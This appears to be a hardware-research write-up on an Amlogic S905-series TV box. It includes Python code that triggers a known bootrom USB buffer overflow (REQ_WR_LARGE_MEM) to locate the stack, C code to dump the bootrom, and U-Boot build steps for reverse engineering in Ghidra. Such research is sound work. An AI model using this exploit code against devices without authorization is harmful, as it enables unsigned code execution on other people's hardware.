<hr style="clear: both; padding-top: 10px; margin-bottom: 30px" />
<p>This Amlogic processor is in a lot of Android TV boxes, which you can buy on marketplaces like Aliexpress. These devices are fun to buy because they are cheap but have quite a lot of pheriperals and features, which you would usually not have in a development board.</p>
<p>The device used in here is the <code>VONTAR X96 Air</code> which is <a href="https://nl.aliexpress.com/item/4000218231701.html?spm=a2g0o.order_list.order_list_main.140.21ef79d2UAsDbQ&amp;gatewayAdapt=glo2nld">available on aliexpress</a>.</p>
<p>This device has the following features:</p>
<div style="margin-left: 30px;padding-top: 10px;">
<ul>
<li>
<p>4GB LPDDR4 RAM</p>
</li>
<li>
<p>64GB eMMC storage</p>
</li>
<li>
<p>1000Mbit ethernet</p>
</li>
<li>
<p>Wifi &amp; Bluetooth</p>
</li>
</ul>
</div>
<h2>Bootrom Exploit</h2>
<p>There is already a bootrom vulnerability for this SoC family, which was published on <a href="https://fredericb.info/2021/02/amlogic-usbdl-unsigned-code-loader-for-amlogic-bootrom.html">fred’s blog</a>. This vulnerability has not yet been exploited on this specific SoC type, so let’s first exploit it.</p>
<p>Let’s first take a look at the memory layout used by the SoC</p>
<ac:image>
<ri:attachment ri:filename="soc_memory_1.jpg"></ri:attachment>
</ac:image><p>According to the documentation from fred’s notes, the vulnerability is in the handling of the <strong>REQ_WR_LARGE_MEM</strong> command. This command does not check if we send empty transfers and due to this we can overflow the download buffer and overwrite our <code>Link Register (LR)</code>.</p>
<p>To check if this vulnerability is present we will first see if we can crash the device. We do this by trying to overflow a large portion of the download buffer and to send payloads with valid pointers to the start of the bootrom. We should be able to send at least 64kb of data to the download buffer, if we can overflow the first part we should at some point get a crash and have an indication of where the stack is located on the target device.</p>
<p>The code to do this is here:</p>
<ac:structured-macro ac:name="code">
<ac:parameter ac:name="language">python</ac:parameter>
<ac:parameter ac:name="linenumbers">false</ac:parameter>
<ac:plain-text-body><![CDATA[def test_vulnerability():
    device = AmlogicDevice()
    controlData = pack('<IIII', D_BUFFER_START, D_BUFFER_MAX, 0, 0)
    device.dev.ctrl_transfer(bmRequestType = 0x40,
        bRequest = REQ_WR_LARGE_MEM,
        wValue = BULK_TRANSFER_SIZE,
        wIndex = 100000,
        data_or_wLength = controlData)

    guess_overflow = 1070 # 0xfffe3688 on a reference device, which is 1078 empty buffers ((0xfffe3688 - D_BUFFER_START) // BULK_TRANSFER_SIZE)
    for i in range(guess_overflow):
        device.usb_write(b"")

    overflow_addr = D_BUFFER_START + (guess_overflow * BULK_TRANSFER_SIZE)
    payload = struct.pack("<Q", BOOTROM_START) * (BULK_TRANSFER_SIZE // 8)
    while True:
        device.usb_write(payload)
        info(f"Overflowing: {hex(overflow_addr)}")

# Results in:
# [i] Overflowing: 0xfffe2e00]]></ac:plain-text-body>
</ac:structured-macro>
<p>The result of this code is that the device crashes at overflow address <strong>0xfffe2e00</strong>, meaning we are probably overwriting the stack here.</p>
<p>This overflow can now be visualised as follows:</p>
<ac:image>
<ri:attachment ri:filename="soc_memory_overflow.jpg"></ri:attachment>
</ac:image><h3>github</h3>
<p>As it turns out, someone else has already exploited this vulnerability, this code can be found <a href="https://github.com/Raxone/amlogic-usbdl_s905x3">on github</a>. This is why it is always good to do a thorough research on existing research when starting a new project.</p>
<h3>Dumping the bootrom</h3>
<p>Using the above code and reference code from uboot we can attach the debugger to this device. We need to implement send/receive, however with only a functioning send we can already know that the debugger is living and we first want to dump the bootrom.</p>
<p>One of the <em>currently</em> missing functionalities is something to run code on the first boot/setup of the GA, since it assumes peek/poke is already setup. This might be something we will need to change in the future. We can dump the bootrom with the following code:</p>
<ac:structured-macro ac:name="code">
<ac:parameter ac:name="language">cpp</ac:parameter>
<ac:parameter ac:name="linenumbers">false</ac:parameter>
<ac:plain-text-body><![CDATA[void recv_data(void *data, uint32_t len) {
    //Dump bootrom
    uint32_t tx = 0;
    send((void *)0xFFFF0000, 0x10000, &tx);
}]]></ac:plain-text-body>
</ac:structured-macro>
<h2>U-Boot</h2>
<p>To get more insight into some <code>BootROM</code> functions, we can build <code>U-Boot</code>. This is an opensource and widely used bootloader. A lot of functionalities are copied into the <code>BootROM</code>, meaning that we could try to get some structures and functions from <code>U-Boot</code> into Ghidra.</p>
<p>To do this we will have to build <code>U-Boot</code> with symbols, then create a symbol database from <code>U-Boot</code> into Ghidra and use that database to find and rename functions in the <code>BootROM</code></p>
<h3>Build U-Boot</h3>
<p>To build U-Boot you will need:</p>
<div style="margin-left: 30px;padding-top: 10px;">
<ul>
<li>
<p>a gcc-aarch64 compiler (sudo apt install gcc-aarch64-linux-gnu)</p>
</li>
<li>
<p>bison (sudo apt install bison)</p>
</li>
<li>
<p>flex (sudo apt install flex)</p>
</li>
</ul>
</div>
<ac:structured-macro ac:name="code">
<ac:parameter ac:name="language">none</ac:parameter>
<ac:parameter ac:name="linenumbers">false</ac:parameter>
<ac:plain-text-body><![CDATA[$ git clone https://source.denx.de/u-boot/u-boot.git
$ export CROSS_COMPILE=aarch64-linux-gnu-
$ export ARCH=arm64
$ make sei610_defconfig
$ make -j2]]></ac:plain-text-body>
</ac:structured-macro>
